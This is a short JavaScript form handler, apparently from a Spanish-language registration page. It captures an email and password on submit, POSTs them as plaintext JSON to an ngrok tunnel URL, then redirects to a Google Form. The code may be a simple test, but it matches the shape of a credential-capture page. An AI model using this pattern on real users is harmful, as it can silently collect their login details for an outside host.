const formElement = document.getElementById("registroForm");

formElement.addEventListener("submit", (event) => {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let transaction = { email: email, password: password };
    let transactionJson = JSON.stringify(transaction);

   fetch("https://6182-45-230-198-19.ngrok-free.app/prueba", {
        method: "POST",
        headers: {
            "Content-Type": "application/json" // Asegúrate de establecer el tipo de contenido
        },
        body: transactionJson
    })
    .then(response => {
        console.log();
    })
        // Limpiar el formulario y redirigir al formulario de Google
        document.getElementById('registroForm').reset();
        window.location.href = "https://docs.google.com/forms/d/1aQvnqWGLfWUFuCgYajcQ13Fr9qAX-BSBsU8W4s8lU7E/edit";
    });
